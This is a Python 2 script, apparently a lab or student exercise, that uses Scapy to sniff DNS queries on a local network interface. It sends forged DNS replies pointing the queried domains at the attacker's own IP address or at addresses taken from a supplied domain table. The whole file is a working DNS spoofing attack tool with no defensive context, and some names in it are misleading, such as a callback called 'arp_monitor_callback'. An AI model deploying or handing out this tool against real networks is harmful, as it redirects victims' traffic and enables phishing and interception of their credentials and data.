#! /usr/bin/env python
from scapy.all import *
import netifaces
import getopt
import socket

#changeToIp = "173.252.89.132"
changeToIp = netifaces.ifaddresses('eth0')[2][0]['addr']
print "Attacket ip is : ",changeToIp
interface = ""
filename = ""
BPFfilter = ""
domainTable = {}
fflag = 0

def arp_monitor_callback(pkt):
	url = pkt["DNS Question Record"].qname 
	url = url[:-1]
	if fflag == 1 and url in domainTable:
		spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst)\
			/UDP(dport=pkt[UDP].sport, sport=53)\
			/DNS(id=pkt[DNS].id,qr=1L,ancount=1,an=DNSRR(rrname=pkt["DNS Question Record"].qname,rdata=domainTable[url])\
			/DNSRR(rrname=pkt["DNS Question Record"].qname,rdata=changeToIp))
	else:
		spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst)\
			/UDP(dport=pkt[UDP].sport, sport=53)\
			/DNS(id=pkt[DNS].id,qr=1L,ancount=1,an=DNSRR(rrname=pkt["DNS Question Record"].qname,rdata=changeToIp)\
			/DNSRR(rrname=pkt["DNS Question Record"].qname,rdata=changeToIp))
	send(spfResp,verbose=0)
	return "Spoofed DNS Response Sent"

interfaces = netifaces.interfaces()
interface = interfaces[1]
opts, remainder = getopt.getopt(sys.argv[1:], "i:f:")

for opt, arg in opts:
	if opt in ('-i'):
		interface = arg
	elif opt in ('-f'):
		filename = arg

BPFfilter = " ".join(str(x) for x in remainder)

print "Interface is ", interface

if len(filename) > 0:
	fflag = 1
	print "filename is ", filename
	with open(filename) as f:
	    for line in f:
		ip, domain = line.split()
		domainTable[domain] = ip
	print domainTable

if len(BPFfilter) > 0: 
	print "BPFfilter is ", BPFfilter
	if "dst port 53" in BPFfilter:
		print "Cannot enter dst port 53 as a BPF filter"
		print "Please try again"
		exit()

sniff(iface=interface,prn=arp_monitor_callback, filter="dst port 53", store=0)

